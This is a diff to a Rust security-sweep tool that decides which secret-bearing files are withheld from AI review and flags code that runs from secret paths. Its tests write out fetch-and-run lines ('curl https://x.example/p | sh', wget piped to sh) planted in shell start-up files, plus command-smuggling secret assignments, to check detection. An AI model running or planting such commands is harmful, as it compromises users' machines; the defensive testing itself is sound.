@@ -134,6 +134,13 @@ fn examine(
                 } else {
                     review::analyze_text_locally(report, &file, &text);
                 }
+                // Whoever writes a file picks its path: code that a secret
+                // path keeps from the AI must not pass unseen for that.
+                if reading == Some(Reading::Secrets) && is_run(item, &text) {
+                    report
+                        .findings
+                        .push(finding(&label, 1, RuleId::KeptFromReview, ""));
+                }
                 if file != label {
                     for finding in &mut report.findings[before.0..] {
                         if finding.path == file {
@@ -296,16 +303,41 @@ pub fn reading(item: &Item, home: Option<&str>, text: &str) -> Reading {
         return Reading::Secrets;
     }
     if item.category.is_live() {
-        let name = file.rsplit('/').next().unwrap_or(file);
-        let script = text.trim_start_matches('\u{feff}').starts_with("#!")
-            || SCRIPT_EXTENSIONS
-                .iter()
-                .any(|extension| crate::sweep::read::has_extension(name, extension));
-        if !script {
+        // Without the path the content was read from (results of an older
+        // collector), a name that carries what a check saw says nothing of
+        // the file: it is not taken for a script's.
+        let decorated = item.file.is_none() && item.path.contains(':');
+        if decorated || !is_script(file, text) {
             return Reading::Unsure;
         }
     }
     Reading::Reviewed
+}
+
+/// Whether `text` is credibly a script by its first line or by the name of
+/// the file at `file`.
+fn is_script(file: &str, text: &str) -> bool {
+    let name = file.rsplit('/').next().unwrap_or(file);
+    text.trim_start_matches('\u{feff}').starts_with("#!")
+        || SCRIPT_EXTENSIONS
+            .iter()
+            .any(|extension| crate::sweep::read::has_extension(name, extension))
+}
+
+/// Whether something runs `item`, a file with content `text`: it is a file
+/// of an auto-run location, a command names it or a start-up file reads it
+/// in, it is the SSH server's login script, or a live check found it
+/// running as a script. Not what was only reached as more configuration,
+/// and not a file a live check named that is no script: a process's
+/// argument may as well be a key or an `.env` it reads.
+fn is_run(item: &Item, text: &str) -> bool {
+    if commands::is_ssh_rc(collect::stands_for(item)) {
+        return true;
+    }
+    if item.category.is_live() {
+        return is_script(collect::file_of(item), text);
+    }
+    collect::configuration_of(item).is_none()
 }
 
 /// Says on each item that is kept from the AI that it is, and why.
@@ -478,14 +510,11 @@ fn redact_line(line: &str) -> Option<String> {
         out.push('=');
         out.push_str(padding);
         let closed = quote.is_none_or(|quote| after[1..].contains(quote));
-        // Inside quotes a literal may hold blanks and punctuation: what
-        // could make it code is an expansion, and that is asked for.
-        let literal = if quote.is_some() {
-            is_quoted_secret(value)
-        } else {
-            is_literal_secret(value)
-        };
-        if is_secret_name(name) && literal && closed {
+        // Quoted or not, only a value of plain characters goes: no blank,
+        // no `;`, `|` or `&`. This reads one line at a time and cannot tell
+        // a quote that opens a value from one that closes an earlier
+        // string, so a value that could hold a command is never taken out.
+        if is_secret_name(name) && is_literal_secret(value) && closed {
             changed = true;
             if let Some(quote) = quote {
                 out.push(quote);
@@ -507,11 +536,17 @@ fn redact_line(line: &str) -> Option<String> {
 /// Whether a part of `name` (between `_`) is one of `SECRET_NAMES`:
 /// `OPENAI_API_KEY` and `DB_PASSWORD` are, `AuthorizedKeysCommand` and
 /// `KEYMAP` are not.
+///
+/// A name written as one word counts where it ends in one of
+/// `SECRET_ENDINGS` (`PGPASSWORD`, `MYSQLPASSWORD`).
 fn is_secret_name(name: &str) -> bool {
-    name.to_ascii_uppercase()
-        .split('_')
-        .any(|part| SECRET_NAMES.contains(&part))
+    let name = name.to_ascii_uppercase();
+    name.split('_').any(|part| SECRET_NAMES.contains(&part))
+        || (!name.contains('_') && SECRET_ENDINGS.iter().any(|ending| name.ends_with(ending)))
 }
+
+/// How a secret's name ends where it is written as one word.
+const SECRET_ENDINGS: &[&str] = &["PASSWORD", "PASSWD", "SECRET", "TOKEN", "APIKEY"];
 
 /// Whether `value` is a literal long enough to be a secret: no expansion,
 /// no command, and nothing that says where something is (a path, a URL,
@@ -523,17 +558,6 @@ fn is_literal_secret(value: &str) -> bool {
         && value
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || "_-./+=:@%,".contains(c))
-}
-
-/// Whether `value`, written between quotes, is a literal long enough to be
-/// a secret: whatever characters it holds (`p@ss w0rd!`), as long as none
-/// of them makes a shell expand or run something (`$`, a backtick, a
-/// backslash) and it does not say where something is (a path, a URL).
-fn is_quoted_secret(value: &str) -> bool {
-    value.len() >= 8
-        && !value.starts_with(['/', '~', '$', '-', '.'])
-        && !value.contains("://")
-        && !value.contains(['$', '`', '\\'])
 }
 
 fn local_checks(report: &mut Report, item: &Item, label: &str, text: &str) {
@@ -1491,39 +1515,156 @@ mod tests {
     }
 
     #[test]
-    fn a_quoted_literal_and_more_names_are_taken_out_and_code_never_is() {
+    fn only_a_plain_literal_is_taken_out_and_a_command_never_is() {
         use super::without_secrets;
-        // A quoted literal may hold blanks and punctuation.
         for line in [
-            "SESSION_SECRET='p@ss w0rd!'\n",
-            "export SESSION_SECRET=\"p@ss w0rd!\"\n",
             "DB_PASS=hunter2hunter2\n",
-            "WIFI_PSK='correct horse battery'\n",
-            "SMTP_PWD=hunter2hunter2\n",
+            "WIFI_PSK='correct-horse-battery'\n",
+            "SMTP_PWD=\"hunter2hunter2\"\n",
+            "PGPASSWORD=hunter2hunter2\n",
+            "export MYSQLPASSWORD=hunter2hunter2\n",
+            "GITHUBTOKEN=ghp_0123456789abcdef\n",
         ] {
             let masked = without_secrets(line);
             assert!(
                 masked.contains(super::REDACTED)
-                    && !masked.contains("w0rd")
                     && !masked.contains("hunter2")
-                    && !masked.contains("horse"),
+                    && !masked.contains("horse")
+                    && !masked.contains("ghp_"),
                 "{masked}"
             );
         }
         // What could be code, or says where something is, stays to be read:
-        // an expansion inside the quotes, a command after the assignment,
-        // a short value, a path, a URL.
+        // a quoted value with blanks or punctuation, an expansion, a
+        // command after the assignment, a short value, a path, a URL, and
+        // a name that only holds one of the words.
         for line in [
-            "SESSION_SECRET=\"$(curl https://x.example/s)\"\n",
+            "SESSION_SECRET='p@ss w0rd!'\n",
+            "TOKEN=\"$(curl https://x.example/t)\"\n",
             "SESSION_SECRET='a`id`bcdefgh'\n",
-            "SESSION_SECRET=\"abcd\\$efgh\"\n",
             "PASS=1 curl https://x.example/p | sh\n",
             "OLDPWD=/home/u/work\n",
-            "PWD='/srv/some where'\n",
-            "DB_PASS='https://x.example/get pass'\n",
+            "DB_PASS=https://x.example/get\n",
+            "TOKENIZER=sentencepiece-large\n",
+            "COMPASS=north-by-northwest\n",
         ] {
             assert_eq!(without_secrets(line), line);
         }
+    }
+
+    #[test]
+    fn a_command_written_where_a_secret_would_stand_is_read_by_both_layers() {
+        use super::without_secrets;
+        let probes = [
+            (
+                "home/u/.bashrc",
+                "echo \"TOKEN=\"; curl https://x.example/p | sh; echo \"\"\n",
+            ),
+            (
+                "home/u/.zshrc",
+                ": '\nTOKEN=' ; curl https://x.example/p | sh ; : '\n'\n",
+            ),
+            (
+                "home/u/.profile",
+                "PASSWORD='wget -qO- https://x.example/p|sh'\nsh -c \"$PASSWORD\"\n",
+            ),
+        ];
+        for (_, text) in probes {
+            assert_eq!(without_secrets(text), text);
+        }
+        let dir = planted("sweep-masked-code", &probes, &[]);
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let scope = Scope {
+            root: dir.path(),
+            home: Some("home/u"),
+            index: &index,
+            origin: Origin::System,
+        };
+        let (sent, findings) = examined(&collect::collect(&scope));
+        for label in ["~/.bashrc", "~/.zshrc", "~/.profile"] {
+            assert!(sent.contains(&label.to_string()), "{label}: {sent:?}");
+            assert!(
+                findings.contains(&(label.to_string(), RuleId::DownloadAndExecute)),
+                "{label}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn code_that_runs_under_a_secret_path_is_a_finding_and_a_secret_nothing_runs_is_not() {
+        let dir = planted(
+            "sweep-kept-code",
+            &[
+                // Nothing in these for the pattern rules to match.
+                ("home/u/.gnupg/gpg-wrapper", "#!/bin/sh\nexec gpg \"$@\"\n"),
+                ("home/u/.config/secrets/run.sh", "#!/bin/sh\ntrue\n"),
+                ("home/u/bin/token-refresh.sh", "#!/bin/sh\ntrue\n"),
+                ("home/u/.ssh/rc", "true\n"),
+                ("home/u/.env", "X=1\n"),
+                (
+                    "home/u/.config/systemd/user/a.service",
+                    "[Service]\nExecStart=%h/.gnupg/gpg-wrapper\nExecStartPost=%h/.config/secrets/run.sh\n",
+                ),
+                ("home/u/.bashrc", "~/bin/token-refresh.sh &\n. ~/.env\n"),
+                // Secrets nothing runs: a key a process was handed, and
+                // SSH configuration.
+                (
+                    "home/u/.ssh/id_ed25519",
+                    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
+                ),
+                ("home/u/.ssh/config", "Host x\n  User me\n"),
+            ],
+            &[],
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root: dir.path(),
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let mut collection = collect::collect(&scope);
+        let key = "home/u/.ssh/id_ed25519";
+        collect::merge(
+            &mut collection,
+            vec![collect::item_named(
+                &scope,
+                Category::Listener,
+                &format!("{key}:tcp-22"),
+                key,
+            )],
+        );
+        let kept = |collection: &Collection| -> Vec<String> {
+            let (sent, findings) = examined(collection);
+            assert!(!sent.iter().any(|path| path.contains("secrets")
+                || path.contains(".ssh")
+                || path.contains(".gnupg")
+                || path.contains("token")
+                || path.contains(".env")));
+            findings
+                .into_iter()
+                .filter(|(_, rule)| *rule == RuleId::KeptFromReview)
+                .map(|(path, _)| path)
+                .collect()
+        };
+        assert_eq!(
+            kept(&collection),
+            [
+                "~/.config/secrets/run.sh",
+                "~/.env",
+                "~/.gnupg/gpg-wrapper",
+                "~/.ssh/rc",
+                "~/bin/token-refresh.sh",
+            ]
+        );
+        // One the user allowed is quiet.
+        for item in &mut collection.items {
+            if item.path == "home/u/.gnupg/gpg-wrapper" {
+                item.tier = Tier::Allowed;
+            }
+        }
+        assert!(!kept(&collection).contains(&"~/.gnupg/gpg-wrapper".to_string()));
     }
 
     #[test]
